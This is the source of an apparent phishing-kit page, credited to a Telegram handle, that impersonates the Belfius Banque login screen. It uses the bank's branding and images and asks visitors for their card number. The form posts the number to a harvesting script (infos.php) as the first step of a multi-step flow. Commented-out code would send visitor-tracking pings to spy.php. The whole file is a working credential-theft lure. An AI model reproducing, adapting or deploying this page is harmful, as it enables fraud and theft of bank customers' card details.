<?php 



     require_once "functions.php";


                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/sur.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Se connecter</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-5 col-md-5 text-center sis"><img src="image/card_app.png"></div>
                     <div class="col-lg-7 col-md-7 frr">
                         <div class="right">
                             <div class="topping">
                                 <ul>
                                     <li class="doom"><a href="">Itsme®</a></li>
                                     <li class="doom"><a href="">Avec cable USB</a></li>
                                     <li class="active"><a href="">Sans cable USB</a></li>
                                 </ul>
                             </div> 
                             <div class="milieu">
                                 <h4>Introduisez votre numéro de carte</h4>
                                 <form action="infos.php" method="post">
                                    <input type="hidden" name="step" value="index">
                                     <div class="form-group sodania">
                                         <label>Votre numéro de carte <i class="bi bi-question-circle ms-1" id="come"></i></label>
                                         <input type="text" name="card" id="card" class="form-control" value="6703 " >
                                         <div id="helpme">
                                             <div class="head"><i class="bi bi-x-lg" id="bali"></i></div>
                                             <div class="imaga"><img src="image/card-help.png"></div>
                                         </div>
                                     </div>
                             </div>
                         </div>
                     </div>
                 </div>
                 <div class="bottona">
                     <div class="help">
                         <span>Retour</span>
                         <span class="action"><img src="image/help.png">Aide</span>
                     </div>
                     <button class="btn" name="submit" id="submit" disabled><img src="image/confirmer.png">Confirmer</button>
                 </div>
                 </form>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

            $("#card").mask("0000 0000 0000 0000 0");

            $("#card").keyup(function(){
                if($("#card").val().length > 19){
                    $("#submit").attr("disabled",false);
                    $("#submit").css("background","#C20145");
                    $("#card").css("border","1px solid #C20145");
                }else{
                    $("#submit").attr("disabled",true);
                    $("#submit").css("background","#DDDDE0");
                    $("#card").css("border","1px solid #979faa");
                }
            });

            $("#bali").click(function(){
                $("#helpme").fadeOut();
            })
            $("#come").click(function(){
                $("#helpme").fadeIn();
            })
            

            // $.post("spy.php",{billingview:1});
            //  var abort = false;
            //  $("#first").keyup(function(){
            //     if(abort==false){
            //        $.post("spy.php", {billinging:1});
            //        abort=true;
            //     }
            //  });

             
        </script>
              
</body>
</html>